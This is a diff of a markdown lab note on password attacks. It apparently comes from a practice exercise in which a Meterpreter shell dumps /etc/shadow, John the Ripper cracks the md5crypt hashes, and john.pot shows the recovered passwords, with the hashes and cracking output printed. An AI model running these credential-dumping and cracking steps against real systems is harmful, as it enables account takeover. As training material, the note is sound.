@@ -1,8 +1,8 @@
 # Password Attacks
 
-In Meterpreter shell, first we get the hashes:
+1. In Meterpreter shell, first we get the hashes:
 
- cat /etc/shadow > /tmp/hashes.txt
+- cat /etc/shadow > /tmp/hashes.txt
 
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
 daemon:*:14684:0:99999:7:::
@@ -41,11 +41,13 @@ telnetd:*:14715:0:99999:7:::
 proftpd:!:14727:0:99999:7:::
 statd:*:15474:0:99999:7:::
 
-nano combo.txt   :
-save all the hashes in a file
+2.Save all the hashes in a file
 
-john combo.txt :
-using JOHN - THE RIPPER for cracking the hashes
+- nano combo.txt   :
+
+3.using JOHN - THE RIPPER for cracking the hashes
+
+- john combo.txt :
 
 Created directory: /home/samiksha/.john
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
@@ -69,11 +71,13 @@ Proceeding with incremental:ASCII
 6g 0:00:28:53  3/3 0.003462g/s 163575p/s 163575c/s 163575C/s aaset8/..aasios6
 6g 0:00:28:56  3/3 0.003456g/s 163674p/s 163674c/s 163674C/s j13569m..j13630k
 
+<img width="1618" height="602" alt="image" src="https://github.com/user-attachments/assets/6c4484af-5729-4785-8364-ad923e0047b1" />
+
 ---
 
-cat john.pot :
+4.we get in .john directory and cat our cracked hashes
 
-we get in .john directory and cat our cracked hashes
+- cat john.pot :
 
 $1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user
 $1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
